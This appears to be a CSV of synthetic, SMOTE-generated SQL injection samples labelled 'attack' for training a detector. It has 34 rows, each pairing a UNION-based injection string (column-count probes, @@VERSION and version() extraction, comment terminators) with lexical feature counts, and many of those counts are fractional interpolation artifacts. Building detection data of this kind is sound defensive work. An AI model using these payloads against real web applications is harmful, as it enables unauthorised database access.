id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance,length,num_unique_chars,entropy,alpha_count,digit_count,space_count,punct_count,alpha_ratio,digit_ratio,space_ratio,punct_ratio,single_quote_count,double_quote_count,dash_count,slash_count,star_count,equals_count,semicolon_count,paren_count,percent_count,underscore_count,comma_count,operator_count,has_single_quote,has_double_quote,has_comment_dashdash,has_comment_hash,has_comment_block,has_equal,has_parentheses,has_semicolon,has_percent_encoding,has_hex_literal,has_concat_operator,kw_select,kw_union,kw_where,kw_from,kw_and,kw_or,kw_insert,kw_update,kw_delete,kw_drop,kw_create,kw_alter,kw_sleep,kw_benchmark,kw_waitfor,kw_delay,kw_information_schema,kw_table,kw_column,kw_database,kw_cast,kw_convert,kw_concat,kw_substr,kw_substring,kw_ascii,kw_char,kw_load_file,kw_outfile,kw_exec,kw_order,kw_by,kw_exists,kw_case,kw_when,keyword_total
SMOTE_000147,attack,union," select * from users where id  =  1 or 1#"". union select null,version  (    )   -- 1",nearest_attack_euclidean,R000012,0.0,84.0,27.0,3.9211228013533774,46.0,3.0,25.0,10.0,0.5476190476190477,0.03571428571428567,0.2976190476190476,0.11904761904761904,0.0,1.0,2.0,0.0,1.0,1.0,0.0,2.0,0.0,0.0,1.0,4.0,0.0,1.0,1.0,1.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,1.0,1.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,6.0
SMOTE_000148,attack,union," select * from users where id  =  '1' union select ""[""_,version  (    )   -- 1'",nearest_attack_euclidean,R000195,2.0297449505593423,79.83144230486639,28.415721152433193,4.0206205094247895,40.0,2.4157211524331927,23.415721152433193,14.0,0.501131787436372,0.03018894927840121,0.29328313768249653,0.1753961256027302,3.0,1.1685576951336145,2.0,0.0,1.0,1.0,0.0,2.0,0.0,1.0,1.0,4.415721152433193,1.0,0.5842788475668071,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000149,attack,union,"-7255' union all select 2127,2127,2127,2127,2127#",nearest_attack_euclidean,R000546,0.36261474511817765,51.34266943829941,19.46853388765988,3.7911142614214945,14.0,25.87413555063953,4.0,7.468533887659882,0.27331920932116716,0.5032534298798756,0.07809120266319061,0.14533615813576656,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.468533887659882,1.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000150,attack,union,"-5424'   )    )    union all select 8231,8231,8231,8231,8231,8231,8231,8231#",nearest_attack_euclidean,R001187,0.1524018881016118,76.0,22.0,3.746130268520445,14.0,36.0,14.0,12.0,0.18421052631578946,0.47368421052631576,0.18421052631578946,0.15789473684210525,1.0,0.0,1.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,7.0,1.0,1.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000151,attack,union,"-3955 where 7276  =  7276 union all select 7276,7276,7276,7276,7276,7276,7276,7276,7276--",nearest_attack_euclidean,R001010,0.0438861776374994,88.6827074981904,22.96827074981904,3.639494472561363,19.0,47.74616599855232,10.0,11.936541499638079,0.21434057140298424,0.5382788812342507,0.11281082705420224,0.13456972030856268,0.0,0.0,3.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,7.936541499638079,4.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000152,attack,union," select * from users where id  =  '1' union select $ .,@@VERSION -- 1'",nearest_attack_euclidean,R000057,0.061621891195670714,70.0,32.02884725356734,4.400631857152238,40.0,2.0,15.971152746432654,12.028847253567344,0.5714285714285714,0.02857142857142858,0.22815932494903793,0.17184067505096207,3.0,0.0,2.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,4.0,1.0,0.0,1.0,0.028847253567344466,0.0,1.0,0.0,0.0,0.0,0.0,0.0,2.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000153,attack,union,"1' in boolean mode  )   union all select null,null,null,null,null,null,null,null,null,null#",nearest_attack_euclidean,R001129,0.4388887587564076,87.51849225566565,18.347217297937306,3.275817014667059,64.17127495772834,1.0,10.347217297937307,12.0,0.7327248410291107,0.01149912201382186,0.11778657279120483,0.1379894641658626,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,9.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000154,attack,union,"-4473'  )   union all select 7656,7656#",nearest_attack_euclidean,R001485,0.38723996140229855,41.2988181088764,21.45976362177528,4.021092372214389,14.0,13.839054487101116,8.0,5.459763621775279,0.3402194326781646,0.3334133494699457,0.19441110438752263,0.13195611346436706,1.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.459763621775279,1.0,1.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000155,attack,union,"-8308""  )   union all select 3084,3084,3084,3084,3084,3084,3084,3084,3084#",nearest_attack_euclidean,R001380,0.2041492247989327,72.48890048227108,20.302219903545783,3.6289802535419926,14.0,38.79112038581686,8.0,11.697780096454215,0.19333243111010673,0.5348583801918536,0.110475674920061,0.16133351377797867,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,7.697780096454215,1.0,0.0,1.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000156,attack,union,"1'   )    )     )   union all select null,null,null,null,null,null--",nearest_attack_euclidean,R001137,0.1600325728036628,66.79600566210861,16.0,3.1847171775719927,37.03680452968689,1.0,18.0,10.759201132421722,0.5542144007606399,0.014986926782887822,0.2697646820919806,0.1610339903644917,1.0,0.0,2.0,0.0,0.0,0.0,0.0,3.0,0.0,0.0,4.7592011324217225,2.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000157,attack,union,"1""   )    )     )   union all select null,null,null,null,null,null,null--",nearest_attack_euclidean,R001415,0.37020108491808557,75.95113849030832,16.0,3.142322320379556,44.36091079224666,1.0,18.0,12.590227698061664,0.5828765054858431,0.01323923747037542,0.23830627446675748,0.1655779825770239,0.0,1.0,2.0,0.0,0.0,0.0,0.0,3.0,0.0,0.0,6.590227698061664,2.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000158,attack,union,"1'   )    )     )   union all select null,null,null,null,null,null,null#",nearest_attack_euclidean,R000730,0.2651632673229661,70.00664937556397,16.0,3.131323452243907,40.40531950045118,1.0,18.0,10.601329875112794,0.5763673230866483,0.014335428007266143,0.2580377041307904,0.15125954477529516,1.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0,0.0,0.0,5.6013298751127945,0.0,1.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000159,attack,union,"-9923%'   )    )     )   union all select 8985,8985,8985,8985,8985,8985,8985#",nearest_attack_euclidean,R001100,0.40497998203094865,75.51813018561579,21.703626037123158,3.593317258764031,14.0,32.0,16.814504148492627,12.703626037123158,0.18556027730905106,0.4241377767064024,0.22211227923752674,0.16818966674701982,1.0,0.0,1.0,0.0,0.0,0.0,0.0,2.7036260371231573,1.0,0.0,6.0,1.0,1.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000160,attack,union,"1 where 2292  =  2292 union all select null,null,null,null#",nearest_attack_euclidean,R000951,0.06133341744336663,59.426292009497566,20.0,3.6981176320665443,35.34103360759805,9.0,10.0,5.085258401899513,0.5945976595645843,0.15152631671465094,0.16836257412738992,0.08551344959337484,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,3.085258401899513,1.0,0.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000161,attack,union,"-7320""  )   where 3907  =  3907 union all select 3907,3907--",nearest_attack_euclidean,R000669,0.37715503637911413,63.54746942737357,24.818646790932362,4.034659872552254,20.637293581864725,21.091529054576483,14.545764527288242,7.272882263644121,0.32370677986113827,0.33208729559979855,0.22947061635937546,0.11473530817968773,0.0,1.0,3.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,1.2728822636441208,4.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000162,attack,union,"-1171' union all select 3958,3958,3958,3958,3958--",nearest_attack_euclidean,R000332,0.11622714800446302,49.13409265673813,20.0,4.030980185701415,14.0,23.307274125390506,4.0,7.826818531347627,0.2853878679136294,0.4738424366701378,0.08153939083246554,0.15923030458376725,1.0,0.0,3.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.8268185313476266,3.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000163,attack,union,"1%'  )   union all select null,null,null--",nearest_attack_euclidean,R000473,0.06252139380414266,42.46263629005415,17.0,3.5260818998193986,26.37010903204332,1.0,8.0,7.092527258010831,0.6206575255514706,0.02359769400638545,0.18878155205108368,0.16696322839106034,1.0,0.0,2.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,2.0925272580108305,2.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000164,attack,union,"1'+  (  select 'gqsk' where 3087  =  3087 union all select null,null,null,null--",nearest_attack_euclidean,R000346,0.3375461534130692,77.47096426102883,27.66279523480384,4.16434222070563,42.976771408823055,9.0,15.0,10.494192852205764,0.5532592924922207,0.11687717724052704,0.19479529540087842,0.13506823486637387,3.0,0.0,2.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,2.4941928522057637,4.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000165,attack,union,"-8034""  )   where 1292  =  1292 union all select 1292,1292,1292,1292,1292#",nearest_attack_euclidean,R000977,0.24467367740324591,77.04033737417839,27.0,3.922099228607196,20.40323263423618,32.93548842282412,14.46774421141206,9.23387210570603,0.2639131414762485,0.4280732133139603,0.1879540771056221,0.12005956810416911,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,4.23387210570603,2.0,0.0,1.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000166,attack,union,"-8414%""  )   union all select 2795#",nearest_attack_euclidean,R001175,0.46087296651825777,37.453908912691915,22.509218217461616,4.090965712222063,14.0,9.963127130153534,8.0,5.490781782538384,0.3754609108730808,0.2636272701813131,0.21454909192747476,0.1463627270181313,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.49078178253838356,1.0,0.0,1.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000167,attack,union,"1'   )    )    as oldh where 9551  =  9551 union all select null,null,null#",nearest_attack_euclidean,R000553,0.1442226855180903,75.97564285375026,23.195128570750054,3.762871604341057,37.78051428300021,9.0,22.0,7.195128570750053,0.4970732976060427,0.11853653571937459,0.2897559762029157,0.09463419047166702,1.0,0.0,0.0,0.0,0.0,1.0,0.0,2.0,0.0,0.0,2.195128570750053,1.0,1.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000168,attack,union,"-1543%' union all select 9341,9341,9341,9341,9341,9341,9341,9341,9341--",nearest_attack_euclidean,R001623,0.08669232558373667,70.29459836489809,20.0,3.6993779325233893,14.0,39.43567869191848,4.0,12.85891967297962,0.19946331629910563,0.5606440204410732,0.056989518942601625,0.18290314431721952,1.0,0.0,3.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,7.858919672979619,3.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000169,attack,union," select * from users where id  =  1 +$ 1 union select null,@@VERSION -- 1",nearest_attack_euclidean,R000126,0.040575206020099217,72.94693275784616,31.053067242153844,4.328291619949685,44.0,2.9469327578461577,16.946932757846156,9.053067242153842,0.6031839723467978,0.0403891349028217,0.23231130792225738,0.12411558482812311,0.0,0.0,2.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,5.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,2.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000170,attack,union,"1""   )    )     )   union all select null,null,null,null,null,null,null,null,null,null#",nearest_attack_euclidean,R001597,0.38363130293602726,84.51581165757236,16.0,3.0569349534706856,53.00632466302894,1.0,17.00632466302894,13.50316233151447,0.6278095859344097,0.011865082600750504,0.20066661230739147,0.15965871915744828,0.0,1.0,0.0,0.0,0.0,0.0,0.0,2.7515811657572353,0.0,0.0,8.751581165757234,0.0,0.0,1.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000171,attack,union,"-8358'   )    )     )   union all select 7282,7282--",nearest_attack_euclidean,R001364,0.08338710714061175,52.0,19.747682920209677,3.538913569633766,14.0,12.0,18.0,8.0,0.2692307692307692,0.23076923076923078,0.34615384615384615,0.15384615384615385,1.0,0.0,3.0,0.0,0.0,0.0,0.0,3.0,0.0,0.0,1.0,3.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000172,attack,union,"-3933'   )    )     )   union all select 6198,6198,6198,6198,6198#",nearest_attack_euclidean,R000245,0.30914190478707143,63.85877864988776,21.0,3.736277849614635,14.0,22.28702291991021,18.0,9.571755729977552,0.22023189905345544,0.3469515219471774,0.28315529878301415,0.14966128021635305,1.0,0.0,1.0,0.0,0.0,0.0,0.0,3.0,0.0,0.0,3.5717557299775526,1.0,1.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000173,attack,union,"-1653 union all select 8415,8415,8415,8415,8415,8415,8415,8415#",nearest_attack_euclidean,R001154,0.15924109245075252,64.03929494164876,19.792141011670246,3.7050347769754666,14.0,36.83143595331901,4.0,9.207858988329752,0.21882583352402363,0.5749219998038614,0.06252166672114962,0.14373049995096535,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.207858988329753,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000174,attack,union,"-2364'+  (  select 'qdut' where 7560  =  7560 union all select 7560,7560,7560,7560,7560--",nearest_attack_euclidean,R001615,0.004699493967482785,88.96731681156467,28.993463362312934,4.280484203184597,29.0,31.973853449251738,15.0,12.993463362312934,0.32597750141724147,0.35936834291186676,0.16860905245719385,0.14604510321369796,3.0,0.0,3.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,3.993463362312934,5.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000175,attack,union,"1'   )    )    union all select null,null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000251,0.1995412010418935,79.62789991386249,16.0,3.110202547404808,51.30231993109,1.0,14.0,13.3255799827725,0.6437012640587383,0.012604736769456643,0.1764663147723923,0.16722768439941285,1.0,0.0,2.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,8.3255799827725,2.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000176,attack,union,"-5572""  )   union all select 8131,8131#",nearest_attack_euclidean,R000411,0.8323325464236433,41.862456010963825,22.408922287280546,4.009125019756713,14.0,12.0,10.453533723683277,5.4089222872805465,0.3366363521998364,0.28854544474271693,0.24570131947376658,0.12911688358368015,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.4089222872805462,0.0,0.0,1.0,1.0,0.0,1.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000177,attack,union,"1   )    )     )   union all select null,null#",nearest_attack_euclidean,R000863,0.1184762764157222,45.3364842616662,14.93364842616662,3.042347080623103,21.73459370466648,1.0,17.73459370466648,4.86729685233324,0.47970329508333437,0.02213980418981512,0.39114407832407394,0.1070128224027766,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.93364842616662,0.0,0.0,0.93364842616662,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000178,attack,union," select * from users where id  =  1.&&@ union select 1,version  (    )   -- 1",nearest_attack_euclidean,R000154,0.07384412855404908,76.71532849833912,27.0,3.941194762038146,40.0,2.8576642491695594,23.0,10.85766424916956,0.521452270141374,0.037211110249530555,0.29983505533129007,0.14150156427780533,0.0,0.0,2.0,0.0,1.0,1.0,0.0,2.0,0.0,0.0,1.0,6.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000179,attack,union,"-5292'  )   union all select 1439,1439,1439,1439#",nearest_attack_euclidean,R001289,0.1790565996683261,47.85025780550794,21.77005156110159,4.073075447567208,14.0,19.08020624440635,8.0,6.770051561101589,0.2931801441200783,0.39792437377817835,0.16753151092575902,0.14136397117598434,1.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,2.770051561101588,1.0,1.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000180,attack,union,"1"" where 7249  =  7249 union all select null,null,null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R001571,0.03787484177648459,91.0,23.0,3.5975232075245325,58.94314096073302,9.0,10.05685903926698,13.0,0.6477268237443189,0.09890109890109888,0.11051493449743933,0.14285714285714285,0.0,1.0,2.0,0.0,0.0,1.0,0.0,0.014214759816745248,0.0,0.0,8.985785240183255,3.0,0.0,1.0,1.0,0.0,0.0,1.0,0.014214759816745026,0.0,0.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
